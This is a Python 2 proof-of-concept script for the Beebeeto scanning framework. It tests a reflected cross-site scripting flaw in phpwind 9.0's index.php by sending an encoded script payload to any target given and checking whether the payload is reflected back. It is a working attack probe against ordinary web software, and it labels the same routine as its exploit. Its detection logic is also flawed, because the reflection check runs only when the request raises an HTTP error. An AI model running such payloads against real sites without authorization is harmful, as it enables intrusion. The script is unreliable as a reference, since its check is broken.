#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0200',
            'name': 'phpwind 9.0 貝塔 反射XSS漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpwind',
            'vul_version': ['9.0'],
            'type': 'Cross Site Scripting',
            'tag': ['phpwind漏洞', 'xss漏洞', '/index.php', 'php'],
            'desc': '漏洞文件：index.php',
            'references': ['http://wooyun.org/bugs/wooyun-2012-012163',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?m=1%22%3E%3Cscript%3Ealert%28%22bb2%22%29%3C%2Fscript%3E%26c%3Dforum'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            content = urllib2.urlopen(req).read()
        except urllib2.URLError, e:
            content = e.read()
            if '<script>alert("bb2")</script>' in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
            return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())